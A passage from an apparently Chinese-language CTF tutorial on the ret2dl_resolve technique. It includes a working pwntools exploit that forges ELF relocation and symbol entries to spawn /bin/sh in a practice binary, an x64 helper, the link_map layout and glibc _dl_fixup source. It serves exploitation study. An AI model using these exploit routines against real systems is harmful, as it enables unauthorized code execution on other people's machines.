reloc_offset=fake_stage-jmprel</span><br><span class="line"></span><br><span class="line">    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    resolve_data += <span class="string">&#x27;a&#x27;</span>*len_bypass_version</span><br><span class="line">    resolve_data += p32(p_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    resolve_call = p32(plt0)+p32(reloc_offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (resolve_data,resolve_call)</span><br></pre></td></tr></table></figure>

<p>来简单的pwn一下上面那个小程序吧。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;terminator&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;bash&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line">cn = process(<span class="string">&#x27;./pwn5_2&#x27;</span>)</span><br><span class="line">binary = ELF(<span class="string">&#x27;./pwn5_2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    gdb.attach(cn,a)</span><br><span class="line">    <span class="keyword">if</span> a==<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        raw_input()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dl_resolve_x86</span>(<span class="params">ELF_obj,func_name,resolve_addr,fake_stage,do_slim=<span class="number">1</span></span>):</span><br><span class="line">    jmprel = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_JMPREL&quot;</span>)<span class="comment">#rel_plt</span></span><br><span class="line">    relent = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_RELENT&quot;</span>)</span><br><span class="line">    symtab = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_SYMTAB&quot;</span>)<span class="comment">#dynsym</span></span><br><span class="line">    syment = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>)</span><br><span class="line">    strtab = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_STRTAB&quot;</span>)<span class="comment">#dynstr</span></span><br><span class="line">    versym = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_VERSYM&quot;</span>)<span class="comment">#version</span></span><br><span class="line">    plt0 = ELF_obj.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    p_name = fake_stage+<span class="number">8</span>-strtab</span><br><span class="line">    len_bypass_version = <span class="number">8</span>-(<span class="built_in">len</span>(func_name)+<span class="number">1</span>)%<span class="number">0x8</span></span><br><span class="line">    sym_addr_offset = fake_stage+<span class="number">8</span>+(<span class="built_in">len</span>(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> == <span class="number">8</span>:</span><br><span class="line">            len_bypass_version+=<span class="number">8</span></span><br><span class="line">            sym_addr_offset = fake_stage+<span class="number">8</span>+(<span class="built_in">len</span>(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error(<span class="string">&#x27;something error!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_sym = sym_addr_offset/<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fake_ndx = u16(ELF_obj.read(versym+fake_sym*<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> fake_ndx != <span class="number">0</span>:</span><br><span class="line">            fake_sym+=<span class="number">1</span></span><br><span class="line">            len_bypass_version+=<span class="number">0x10</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> do_slim:</span><br><span class="line">        slim = len_bypass_version - len_bypass_version%<span class="number">8</span></span><br><span class="line">        version = len_bypass_version%<span class="number">8</span></span><br><span class="line">        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (resolve_data,resolve_call,fake_stage+slim)</span><br><span class="line"></span><br><span class="line">    fake_r_info = fake_sym&lt;&lt;<span class="number">8</span>|<span class="number">0x7</span></span><br><span class="line">    reloc_offset=fake_stage-jmprel</span><br><span class="line"></span><br><span class="line">    resolve_data = p32(resolve_addr)+p32(fake_r_info)+func_name+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    resolve_data += <span class="string">&#x27;a&#x27;</span>*len_bypass_version</span><br><span class="line">    resolve_data += p32(p_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    resolve_call = p32(plt0)+p32(reloc_offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (resolve_data,resolve_call)</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1ret = <span class="number">0x080482c9</span></span><br><span class="line">p3ret = <span class="number">0x080484a9</span></span><br><span class="line"></span><br><span class="line">stage = binary.bss()</span><br><span class="line"></span><br><span class="line">dl_data,dl_call,stage = ret2dl_resolve_x86(binary,<span class="string">&#x27;system&#x27;</span>,binary.bss()+<span class="number">0x200</span>,stage)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;a&#x27;</span>*<span class="number">40</span> + <span class="string">&#x27;bbbb&#x27;</span></span><br><span class="line">pay += p32(binary.plt[<span class="string">&#x27;read&#x27;</span>])+p32(p3ret)+p32(<span class="number">0</span>)+p32(stage)+p32(<span class="built_in">len</span>(dl_data)+<span class="number">8</span>)</span><br><span class="line">pay += dl_call</span><br><span class="line">pay += p32(p1ret)+p32(stage+<span class="built_in">len</span>(dl_data))</span><br><span class="line"></span><br><span class="line">cn.sendline(pay)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"><span class="comment">#z(&#x27;b _dl_runtime_resolve\nb _dl_fixup\nc&#x27;)</span></span><br><span class="line">cn.send(dl_data+<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cn.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="x64"><a href="#x64" class="headerlink" title="x64"></a>x64</h2><p>大体上一致，也是构造结构体。但是结构体的大小以及有些元素的顺序发生了变化。</p>
<p>绕过version的方法不能再用用x86的方法了,这是因为在64位下,程序一般分配了0x400000-0x401000,0x600000-0x601000,0x601000-0x602000这三个段,而VERSYM在0x400000-0x401000,伪造的一些表我们一般是伪造在0x601000-0x602000这个rw段上,这样idx是落不到已经分配的段上的,因此构造失败.</p>
<p>方法变成了覆盖 (link_map + 0x1c8) 处为 NULL, 也就是<code>if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)</code>这一句.<br>但是link_map是在ld.so上的,因此我们需要leak,若程序没有输出函数,则无法使用这个方法.</p>
<p>参考上面几篇文章的方法,我也写了一个x64版的ret2dl_resolve函数来学习.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dl_resolve_x64</span>(<span class="params">ELF_obj,func_name,resolve_addr,fake_stage,do_slim=<span class="number">1</span></span>):</span><br><span class="line">    <span class="comment"># prerequisite:</span></span><br><span class="line">    <span class="comment"># 1) overwrite (link_map + 0x1c8) with NULL</span></span><br><span class="line">    <span class="comment"># 2) set registers for arguments</span></span><br><span class="line">    jmprel = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_JMPREL&quot;</span>)<span class="comment">#rel_plt</span></span><br><span class="line">    relaent = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_RELAENT&quot;</span>)</span><br><span class="line">    symtab = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_SYMTAB&quot;</span>)<span class="comment">#dynsym</span></span><br><span class="line">    syment = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>)</span><br><span class="line">    strtab = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_STRTAB&quot;</span>)<span class="comment">#dynstr</span></span><br><span class="line">    versym = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_VERSYM&quot;</span>)<span class="comment">#version</span></span><br><span class="line">    plt0 = ELF_obj.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    padding1 = relaent-(fake_stage-symtab)%relaent</span><br><span class="line">    padding2 = (jmprel-symtab)%relaent</span><br><span class="line"></span><br><span class="line">    reloc_offset=(fake_stage+padding1+relaent+padding2-jmprel)/relaent</span><br><span class="line">    st_name = fake_stage+padding1+relaent+padding2+relaent-strtab</span><br><span class="line">    fake_sym = (fake_stage+padding1-symtab)/relaent</span><br><span class="line">    fake_r_info = fake_sym&lt;&lt;<span class="number">32</span>|<span class="number">0x7</span></span><br><span class="line"></span><br><span class="line">    resolve_data=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> do_slim:</span><br><span class="line">        resolve_data+=<span class="string">&#x27;A&#x27;</span>*padding1</span><br><span class="line"></span><br><span class="line">    resolve_data += p32(st_name)+p32(<span class="number">0x12</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data += <span class="string">&#x27;b&#x27;</span>*padding2</span><br><span class="line">    resolve_data += p64(resolve_addr)+p64(fake_r_info)+p64(<span class="number">0</span>)</span><br><span class="line">    resolve_data += func_name+<span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">    resolve_call = p64(plt0)+p64(reloc_offset)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> do_slim:</span><br><span class="line">        <span class="keyword">return</span> (resolve_data,resolve_call)</span><br><span class="line">    <span class="keyword">return</span> (resolve_data,resolve_call,fake_stage+padding1)</span><br></pre></td></tr></table></figure>



<p>这样,在64位上的ret2dlresolve就有了一个很大的局限点,就是需要leak,并overwrite,有这个能力的话,其实我们就有很多其他更好的target了.有没有不需要leak&amp;overwrite的办法??</p>
<p>有</p>
<p>我们调用<code>_dl_runtime_resolve</code>的时候的时候传进去了两个参数,一个是linkmap,一个是我们伪造的<code>rel_offset</code>,绕过的方法就是伪造linkmap!!</p>
<p>reference: <a target="_blank" rel="noopener" href="http://ddaa.tw/hitcon_pwn_200_blinkroot.html">http://ddaa.tw/hitcon_pwn_200_blinkroot.html</a></p>
<p>注: 由于x86下无需伪造linkmap就能无leak使用<code>ret2dl_resolve</code>,因此此处我们仅讨论64位下的情况</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">00000000 link_map        struc ; (sizeof=0x470, align=0x8, copyof_95, variable size)</span><br><span class="line">00000000                                         ; XREF: rtld_global/r</span><br><span class="line">00000000 l_addr          dq ?                    ; XREF: dl_main+17FD/r</span><br><span class="line">00000000                                         ; _dl_start+48/w ...</span><br><span class="line">00000008 l_name          dq ?                    ; XREF: dl_main+21B/w</span><br><span class="line">00000008                                         ; dl_main+180B/r ... ; offset</span><br><span class="line">00000010 l_ld            dq ?                    ; XREF: dl_main+1137/r</span><br><span class="line">00000010                                         ; _dl_start+3E/w ; offset</span><br><span class="line">00000018 l_next          dq ?                    ; XREF: dl_main+FD5/w</span><br><span class="line">00000018                                         ; dl_main+1A48/r ... ; offset</span><br><span class="line">00000020 l_prev          dq ?                    ; XREF: dl_main+1865/w</span><br><span class="line">00000020                                         ; dl_main+1A4F/r ... ; offset</span><br><span class="line">00000028 l_real          dq ?                    ; XREF: _dl_start+221/w ; offset</span><br><span class="line">00000030 l_ns            dq ?</span><br><span class="line">00000038 l_libname       dq ?                    ; XREF: dl_main:loc_211A/r</span><br><span class="line">00000038                                         ; dl_main+8CF/r ... ; offset</span><br><span class="line">00000040 l_info          dq 76 dup(?)            ; XREF: dl_main:loc_2128/r</span><br><span class="line">00000040                                         ; dl_main+8C8/r ... ; offset</span><br><span class="line">000002A0 l_phdr          dq ?                    ; XREF: dl_main+18BD/w ; offset</span><br><span class="line">000002A8 l_entry         dq ?</span><br><span class="line">000002B0 l_phnum         dw ?                    ; XREF: dl_main+18C8/w</span><br><span class="line">000002B2 l_ldnum         dw ?</span><br><span class="line">000002B4                 db ? ; undefined</span><br><span class="line">000002B5                 db ? ; undefined</span><br><span class="line">000002B6                 db ? ; undefined</span><br><span class="line">000002B7                 db ? ; undefined</span><br><span class="line">000002B8 l_searchlist    r_scope_elem ?</span><br><span class="line">000002C8 l_symbolic_searchlist r_scope_elem ?</span><br><span class="line">000002D8 l_loader        dq ?                    ; offset</span><br><span class="line">000002E0 l_versions      dq ?                    ; offset</span><br><span class="line">000002E8 l_nversions     dd ?</span><br><span class="line">000002EC l_nbuckets      dd ?</span><br><span class="line">000002F0 l_gnu_bitmask_idxbits dd ?</span><br><span class="line">000002F4 l_gnu_shift     dd ?</span><br><span class="line">000002F8 l_gnu_bitmask   dq ?                    ; offset</span><br><span class="line">00000300 _anon_0         $BA86E67FF2820C66E7CADF8F281E050C ?</span><br><span class="line">00000308 _anon_1         $5C94D562908A6C967CD4DD6D0F71A7A2 ?</span><br><span class="line">00000310 l_direct_opencount dd ?</span><br><span class="line">00000314 _bf314          db ?                    ; XREF: dl_main:loc_218B/r</span><br><span class="line">00000314                                         ; dl_main:loc_30A0/r ...</span><br><span class="line">00000315 _bf315          db ?</span><br><span class="line">00000316 _bf316          db ?</span><br><span class="line">00000317                 db ? ; undefined</span><br><span class="line">00000318 l_rpath_dirs    r_search_path_struct ?</span><br><span class="line">00000328 l_reloc_result  dq ?                    ; offset</span><br><span class="line">00000330 l_versyms       dq ?                    ; offset</span><br><span class="line">00000338 l_origin        dq ?                    ; offset</span><br><span class="line">00000340 l_map_start     dq ?                    ; XREF: _dl_start+22F/w</span><br><span class="line">00000340                                         ; _dl_check_caller+86/r</span><br><span class="line">00000348 l_map_end       dq ?                    ; XREF: _dl_start+23D/w</span><br><span class="line">00000350 l_text_end      dq ?                    ; XREF: _dl_start+24B/w</span><br><span class="line">00000350                                         ; _dl_check_caller+91/r</span><br><span class="line">00000358 l_scope_mem     dq 4 dup(?)             ; offset</span><br><span class="line">00000378 l_scope_max     dq ?</span><br><span class="line">00000380 l_scope         dq ?                    ; offset</span><br><span class="line">00000388 l_local_scope   dq 2 dup(?)             ; offset</span><br><span class="line">00000398 l_file_id       r_file_id ?             ; XREF: _dl_map_object_from_fd:loc_6308/r</span><br><span class="line">00000398                                         ; _dl_map_object_from_fd+D6F/r</span><br><span class="line">000003A8 l_runpath_dirs  r_search_path_struct ?</span><br><span class="line">000003B8 l_initfini      dq ?                    ; offset</span><br><span class="line">000003C0 l_reldeps       dq ?                    ; offset</span><br><span class="line">000003C8 l_reldepsmax    dd ?</span><br><span class="line">000003CC l_used          dd ?</span><br><span class="line">000003D0 l_feature_1     dd ?</span><br><span class="line">000003D4 l_flags_1       dd ?</span><br><span class="line">000003D8 l_flags         dd ?</span><br><span class="line">000003DC l_idx           dd ?</span><br><span class="line">000003E0 l_mach          link_map_machine ?</span><br><span class="line">000003F8 l_lookup_cache  $2455BD847B398C721BD5A7DEADBA279A ?</span><br><span class="line">00000418 l_tls_initimage dq ?                    ; offset</span><br><span class="line">00000420 l_tls_initimage_size dq ?</span><br><span class="line">00000428 l_tls_blocksize dq ?                    ; XREF: dl_main:loc_3177/r</span><br><span class="line">00000430 l_tls_align     dq ?</span><br><span class="line">00000438 l_tls_firstbyte_offset dq ?</span><br><span class="line">00000440 l_tls_offset    dq ?                    ; XREF: _dl_start+44C/r</span><br><span class="line">00000440                                         ; _dl_start+474/r</span><br><span class="line">00000448 l_tls_modid     dq ?                    ; XREF: dl_main+1916/w</span><br><span class="line">00000450 l_tls_dtor_count dq ?</span><br><span class="line">00000458 l_relro_addr    dq ?                    ; XREF: dl_main+18F5/w</span><br><span class="line">00000458                                         ; _dl_map_object_from_fd:loc_6928/r</span><br><span class="line">00000460 l_relro_size    dq ?                    ; XREF: dl_main+1900/w</span><br><span class="line">00000460                                         ; _dl_map_object_from_fd+126D/r</span><br><span class="line">00000468 l_serial        dq ?</span><br><span class="line">00000470 l_audit         auditstate 0 dup(?)</span><br><span class="line">00000470 link_map        ends</span><br></pre></td></tr></table></figure>

<p>可以看到linkmap很大,基本没有办法完整的伪造一份.<br>而且linkmap中有一个叫<code>l_scope</code>的成员在<code>_dl_fixup</code>内部的<code>_dl_lookup_symbol_x</code>会用上,而<code>l_scope</code>指向ld内部,因此无法伪造.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">              version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>
<p>bypass的方法就是不进<code>_dl_lookup_symbol_x</code>,利用已解析的函数来调用任意函数,方法如下.</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">       ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">       <span class="keyword">struct</span> link_map *l, <span class="built_in">ElfW</span>(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (<span class="built_in">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  <span class="built_in">assert</span> (<span class="built_in">ELFW</span>(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (<span class="built_in">ELFW</span>(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">r_found_version</span> *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">        (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)]);</span><br><span class="line">      <span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">      version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">      <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">        version = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">     not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">     we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">THREAD_GSCOPE_SET_FLAG</span> ();</span><br><span class="line">      flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">                    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">    <span class="built_in">THREAD_GSCOPE_RESET_FLAG</span> ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span 